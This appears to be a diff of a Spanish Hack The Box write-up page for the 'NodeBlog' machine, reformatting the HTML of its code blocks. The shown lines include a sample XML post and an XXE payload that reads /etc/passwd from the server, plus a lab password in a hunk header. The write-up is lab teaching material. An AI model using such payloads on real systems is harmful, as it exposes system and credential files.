@@ -19,7 +19,7 @@
 <meta itemprop=name content="NodeBlog">
 <meta itemprop=description content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene un blog que es vulnerable a inyección NoSQL, luego a inyección de Entidades Externas XML (XXE) y finalmente a deserialización insegura para obtener ejecución remota de comandos. Para comprometer esta máquina se necesitan técnicas avanzadas de explotación web y habilidades de programación. En este write-up se utilizan scripts en Bash, Python y Node.js para explotar todas las vulnerabilidades"><meta itemprop=datePublished content="2022-01-10T00:00:00+01:00">
 <meta itemprop=dateModified content="2022-01-10T00:00:00+01:00">
-<meta itemprop=wordCount content="1366">
+<meta itemprop=wordCount content="1367">
 <meta itemprop=keywords content="cve,sudo,express,nosqli,xxe,insecure-deserialization,user-enumeration,password-reuse,rce,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="NodeBlog">
@@ -260,23 +260,23 @@ Password: IppsecSaysPleaseSubscribe
 <p>Existe otra funcionalidad que es subir un artículo. Podemos añadir un archivo cualquiera y obtener un error de XML:</p>
 <p><img src=/images/HTB/NodeBlog/NodeBlog-xml.png alt="NodeBlog XML error"></p>
 <p>Entonces, necesitamos subir un documento XML válido, como este:</p>
-<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;
-<span class=mtk1>&lt;</span><span class=mtk5>post</span><span class=mtk1>&gt;
-<span class=mtkw>&nbsp;&nbsp;</span><span class=mtk1>&lt;</span><span class=mtk5>title</span><span class=mtk1>&gt;ASDF&lt;/</span><span class=mtk5>title</span><span class=mtk1>&gt;
-<span class=mtkw>&nbsp;&nbsp;</span><span class=mtk1>&lt;</span><span class=mtk5>description</span><span class=mtk1>&gt;&lt;/</span><span class=mtk5>description</span><span class=mtk1>&gt;
-<span class=mtkw>&nbsp;&nbsp;</span><span class=mtk1>&lt;</span><span class=mtk5>markdown</span><span class=mtk1>&gt;&lt;/</span><span class=mtk5>markdown</span><span class=mtk1>&gt;
-<span class=mtk1>&lt;/</span><span class=mtk5>post</span><span class=mtk1>&gt;
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;</span>
+<span class=mtk1>&lt;</span><span class=mtk5>post</span><span class=mtk1>&gt;</span>
+  <span class=mtk1>&lt;</span><span class=mtk5>title</span><span class=mtk1>&gt;ASDF&lt;/</span><span class=mtk5>title</span><span class=mtk1>&gt;</span>
+  <span class=mtk1>&lt;</span><span class=mtk5>description</span><span class=mtk1>&gt;&lt;/</span><span class=mtk5>description</span><span class=mtk1>&gt;</span>
+  <span class=mtk1>&lt;</span><span class=mtk5>markdown</span><span class=mtk1>&gt;&lt;/</span><span class=mtk5>markdown</span><span class=mtk1>&gt;</span>
+<span class=mtk1>&lt;/</span><span class=mtk5>post</span><span class=mtk1>&gt;</span>
 </code></pre></div>
 <p>Y vemos que el servidor lo analiza y rellena los campos del formulario para editar el artículo:</p>
 <p><img src=/images/HTB/NodeBlog/NodeBlog-edit.png alt="NodeBlog edit"></p>
 <p>En este punto, podemos efectuar una inyección de Entidad Externa XML (XXE), esto es, añadir una entidad que tome el contenido de un archivo y lo ponga en un elemento del documento XML. Un simple <em>payload</em> XXE sería el siguiente:</p>
-<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;
-<span class=mtk1>&lt;!</span><span class=mtk5>DOCTYPE</span> <span class=mtk9>foo</span> <span class=mtk1>[&lt;!</span><span class=mtk5>ENTITY</span> <span class=mtk9>xxe</span> <span class=mtk5>SYSTEM</span> <span class=mtk4>"</span><span class="mtk4 detected-link">file:///etc/passwd</span><span class=mtk4>"</span><span class=mtk1>&gt;]</span> <span class=mtk1>&gt;
-<span class=mtk1>&lt;</span><span class=mtk5>post</span><span class=mtk1>&gt;
-<span class=mtkw>&nbsp;&nbsp;</span><span class=mtk1>&lt;</span><span class=mtk5>title</span><span class=mtk1>&gt;ASDF&lt;/</span><span class=mtk5>title</span><span class=mtk1>&gt;
-<span class=mtkw>&nbsp;&nbsp;</span><span class=mtk1>&lt;</span><span class=mtk5>description</span><span class=mtk1>&gt;</span><span class=mtk6>&amp;xxe;</span><span class=mtk1>&lt;/</span><span class=mtk5>description</span><span class=mtk1>&gt;
-<span class=mtkw>&nbsp;&nbsp;</span><span class=mtk1>&lt;</span><span class=mtk5>markdown</span><span class=mtk1>&gt;&lt;/</span><span class=mtk5>markdown</span><span class=mtk1>&gt;
-<span class=mtk1>&lt;/</span><span class=mtk5>post</span><span class=mtk1>&gt;
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;</span>
+<span class=mtk1>&lt;!</span><span class=mtk5>DOCTYPE</span> <span class=mtk9>foo</span> <span class=mtk1>[ &lt;!</span><span class=mtk5>ENTITY</span> <span class=mtk9>xxe</span> <span class=mtk5>SYSTEM</span> <span class=mtk4>"</span><span class="mtk4 detected-link">file:///etc/passwd</span><span class=mtk4>"</span><span class=mtk1>&gt; ]&gt;</span>
+<span class=mtk1>&lt;</span><span class=mtk5>post</span><span class=mtk1>&gt;</span>
+  <span class=mtk1>&lt;</span><span class=mtk5>title</span><span class=mtk1>&gt;ASDF&lt;/</span><span class=mtk5>title</span><span class=mtk1>&gt;</span>
+  <span class=mtk1>&lt;</span><span class=mtk5>description</span><span class=mtk1>&gt;</span><span class=mtk6>&amp;xxe;</span><span class=mtk1>&lt;/</span><span class=mtk5>description</span><span class=mtk1>&gt;</span>
+  <span class=mtk1>&lt;</span><span class=mtk5>markdown</span><span class=mtk1>&gt;&lt;/</span><span class=mtk5>markdown</span><span class=mtk1>&gt;</span>
+<span class=mtk1>&lt;/</span><span class=mtk5>post</span><span class=mtk1>&gt;</span>
 </code></pre></div>
 <p>Si subimos este documento, obtenemos el archivo <code>/etc/passwd</code> en el campo de descripción:</p>
 <p><img src=/images/HTB/NodeBlog/NodeBlog-xxe.png alt="NodeBlog XXE"></p>
